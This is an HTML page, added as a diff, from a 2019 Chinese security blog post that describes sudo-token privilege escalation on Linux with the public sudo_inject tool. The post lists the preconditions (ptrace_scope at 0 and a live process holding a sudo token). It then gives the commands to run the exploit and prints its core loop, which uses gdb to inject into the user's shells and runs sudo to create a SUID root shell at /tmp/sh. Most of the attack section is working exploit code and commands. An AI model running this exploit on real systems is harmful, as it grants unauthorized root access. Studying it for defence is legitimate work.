@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="sudo token提权昨日在安全热点中见到一个说到sudo的token来获得root权限 Referer:sudo token提权仓库地址:https://github.com/nongiach/sudo_inject 使用条件12Ptrace完全启用（/ proc / sys / kernel / yama / ptrace_scope == 0）。当前用户必须具有具有相同uid的有效sudo">
+<meta name="keywords" content="Linux提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sudo token提权">
+<meta property="og:url" content="http://422926799.github.io/posts/2b74b00d.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="sudo token提权昨日在安全热点中见到一个说到sudo的token来获得root权限 Referer:sudo token提权仓库地址:https://github.com/nongiach/sudo_inject 使用条件12Ptrace完全启用（/ proc / sys / kernel / yama / ptrace_scope == 0）。当前用户必须具有具有相同uid的有效sudo">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/04/EaJwNj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/04/EaJyvV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/04/EaYMrT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/04/EaY3a4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/04/EaYveU.png">
+<meta property="og:updated_time" content="2019-05-04T03:45:37.748Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sudo token提权">
+<meta name="twitter:description" content="sudo token提权昨日在安全热点中见到一个说到sudo的token来获得root权限 Referer:sudo token提权仓库地址:https://github.com/nongiach/sudo_inject 使用条件12Ptrace完全启用（/ proc / sys / kernel / yama / ptrace_scope == 0）。当前用户必须具有具有相同uid的有效sudo">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/05/04/EaJwNj.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>sudo token提权</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/26a6c441.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/126651c2.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/2b74b00d.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/2b74b00d.html&text=sudo token提权"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/2b74b00d.html&is_video=false&description=sudo token提权"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sudo token提权&body=Check out this article: http://422926799.github.io/posts/2b74b00d.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/2b74b00d.html&name=sudo token提权&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-token提权"><span class="toc-number">1.</span> <span class="toc-text">sudo token提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用条件"><span class="toc-number">2.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用方法"><span class="toc-number">3.</span> <span class="toc-text">利用方法</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        sudo token提权
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-05-04T02:58:59.000Z" itemprop="datePublished">2019-05-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Linux提权/">Linux提权</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="sudo-token提权"><a href="#sudo-token提权" class="headerlink" title="sudo token提权"></a>sudo token提权</h2><p>昨日在安全热点中见到一个说到sudo的token<br>来获得root权限</p>
+<p>Referer:<a href="https://paper.tuisec.win/detail/8cebac7cd7f4a83" target="_blank" rel="noopener">sudo token提权</a><br>仓库地址:<a href="https://github.com/nongiach/sudo_inject" target="_blank" rel="noopener">https://github.com/nongiach/sudo_inject</a></p>
+<h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ptrace完全启用（/ proc / sys / kernel / yama / ptrace_scope == 0）。</span><br><span class="line">当前用户必须具有具有相同uid的有效sudo令牌的生活进程。</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/05/04/EaJwNj.png" alt=""></p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>下载上面所说的仓库地址，在本地执行echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope模拟一个环境<br><img src="https://s2.ax1x.com/2019/05/04/EaJyvV.png" alt=""><br>执行以下两条命令，你将获得一个root权限的终端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_v2.sh</span><br><span class="line">/tmp/sh -p</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/05/04/EaYMrT.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/05/04/EaY3a4.png" alt=""></p>
+<p>看了一下exploit_v2.sh里的利用代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># create suid shell</span><br><span class="line">echo &quot;Creating suid shell in /tmp/sh&quot;</span><br><span class="line">echo &quot;Current process : $$&quot;</span><br><span class="line"># inject all shell belonging to the current user, our shell one :p</span><br><span class="line">for pid in $(pgrep &apos;^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$&apos; -u &quot;$(id -u)&quot; | grep -v &quot;^$$\$&quot;)</span><br><span class="line">do</span><br><span class="line">        echo &quot;Injecting process $pid -&gt; &quot;$(cat &quot;/proc/$pid/comm&quot;)</span><br><span class="line">	echo &apos;call system(&quot;echo | sudo -S cp /bin/sh /tmp &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo | sudo -S chmod +s /tmp/sh &gt;/dev/null 2&gt;&amp;1&quot;)&apos; \</span><br><span class="line">		| gdb -q -n -p &quot;$pid&quot; &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
+<p>文章还有其他的操作，详情请看仓库地址</p>
+<p><img src="https://s2.ax1x.com/2019/05/04/EaYveU.png" alt=""></p>
+<hr>
+<p>你可以自由地：<br>分享 – 在任何媒介或格式下再分发、传播本创作。<br>只要遵守下述条款规定，授权人将不能撤回你使用本创作的自由。<br>唯须遵循以下条款：<br>署名 – 你必须以给予姓名标注，并提供本许可证的链接。同时你需要声明公开的创作是否经过修改。你可以采用恰当的形式将相关信息表述出来，但不得以任何形式暗示授权人已正式认可了你以及你的使用行为。<br>非商业性 – 你不得将本创作运用于商业目的。<br>禁止演绎 – 如果你对本创作进行了重混、转换、依据本创作进行再创作等行为，你不得再次公开散布经过修改的创作。<br>不得增加额外限制 – 你不能增设任何法律限制或是技术限制，来限制他人进行本许可证已经允许的行为。</p>
+<p>声明：<br>当你使用本创作中属于公众领域的元素，或当法律有额外或限制条款允许你的使用行为时，则你不需要遵守本授权协议。</p>
+<p>不提供保证。本授权协议并不能完全提供你预期需要的所有许可，例如：公共形象权，隐私权，著作人身权等其他权利，这些权利的法律限制可能会限制你使用本创作。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-token提权"><span class="toc-number">1.</span> <span class="toc-text">sudo token提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用条件"><span class="toc-number">2.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用方法"><span class="toc-number">3.</span> <span class="toc-text">利用方法</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/2b74b00d.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/2b74b00d.html&text=sudo token提权"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/2b74b00d.html&is_video=false&description=sudo token提权"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sudo token提权&body=Check out this article: http://422926799.github.io/posts/2b74b00d.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/2b74b00d.html&title=sudo token提权"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/2b74b00d.html&name=sudo token提权&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
